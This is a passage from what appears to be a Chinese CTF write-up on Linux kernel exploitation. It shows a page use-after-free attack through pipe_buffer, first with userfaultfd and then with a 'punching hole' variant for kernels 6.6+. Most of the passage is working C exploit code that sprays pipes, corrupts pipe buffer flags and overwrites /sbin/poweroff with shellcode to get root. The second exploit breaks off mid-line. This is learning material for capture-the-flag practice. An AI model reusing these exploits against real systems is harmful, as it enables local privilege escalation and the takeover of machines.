&#125;</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *alloc_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(alloc_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], alloc_buf, <span class="number">0x20</span>);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ±‚è§£æ•ˆæœ-2"><a href="#æ±‚è§£æ•ˆæœ-2" class="headerlink" title="æ±‚è§£æ•ˆæœ"></a>æ±‚è§£æ•ˆæœ</h3><img src="/2024/10/07/kno_puts/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="punching-hole-pipe-buffer-page-UAF"><a href="#punching-hole-pipe-buffer-page-UAF" class="headerlink" title="punching hole + pipe_buffer  + page UAF"></a><font style="color:rgb(52, 73, 94);">punching hole</font> + pipe_buffer  + page UAF</h2><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>è¿™é‡Œæˆ‘ä»¬å¯¹é¢˜ç›®å†è¿›è¡Œæœ€åä¸€æ¬¡å‡çº§ï¼Œæˆ‘ä»¬å‡è®¾ <code>kernel</code> ç‰ˆæœ¬ä¸º <code>6.6+</code>ï¼Œè¿™ä¸ªæ—¶å€™ <code>userfaultfd</code> å°±åªè¿è¡Œç‰¹æƒç”¨æˆ·ä½¿ç”¨äº†ã€‚ä¹Ÿè®¸æˆ‘ä»¬ä¼šæƒ³åˆ°ç”¨ <code>fuse</code>ï¼Œå¯æ˜¯åœ¨ <code>kernel pwn</code> è¿™ç§ç¯å¢ƒæ®‹ç¼ºçš„æƒ…å†µå¾ˆéš¾ä½¿ç”¨ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ <code>puching hole</code>ã€‚è¿™ä¸ªæ‰“æ³•ç¬”è€…æ˜¯ç¬¬ä¸€æ¬¡å¬ï¼Œç½‘ä¸Šä¹Ÿæ‰¾ä¸åˆ°ä»€ä¹ˆèµ„æ–™ï¼Œæœ€åä¹Ÿæ˜¯è¯·æ•™ Csome å¸ˆå…„å’Œ cnitlrt å¸ˆå‚…ã€‚å¤§è‡´æ„æ€å°±æ˜¯æŠŠçº¿ç¨‹ä¸¢åˆ°ä¸€ä¸ªç­‰å¾…é˜Ÿåˆ—ï¼Œä»¤ä¸€ä¸ªçº¿ç¨‹ä¼‘çœ ï¼Œå…¶è§¦å‘æ¡ä»¶å’Œ <code>userfaultfd</code> ä¸€æ ·ä¹Ÿæ˜¯é€šè¿‡ <code>copy</code> ç±»å‡½æ•°è§¦å‘ã€‚å°† <code>userfaultfd</code> æ”¹ç”¨ <code>punching hole</code> åå…¶ä½™æ“ä½œå’Œä¸Šé¢é‚£ä¸ª <code>exp</code> ä¸€è‡´ï¼Œä¸è¿‡ç”±äºä½¿ç”¨äº† <font style="color:rgb(52, 73, 94);"><code>punching hole</code> åå †çš„å¸ƒå±€æœ‰äº†ç‚¹å˜åŒ–ï¼Œæ‰€ä»¥æˆ‘ <code>pipe_buffer</code> åœ¨å †å— <code>uaf</code> çš„å‰é¢å’Œåé¢å„å–·äº†ä¸€æ¬¡ä»¥æ¥æé«˜å‘½ä¸­ç‡ã€‚</font></p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SECONDARY_PIPE_COUNT 0x150</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"><span class="type">int</span> snd_pipe_fd[MAX_SECONDARY_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s\n&quot;</span>, __PRETTY_FUNCTION__);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SECONDARY_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span 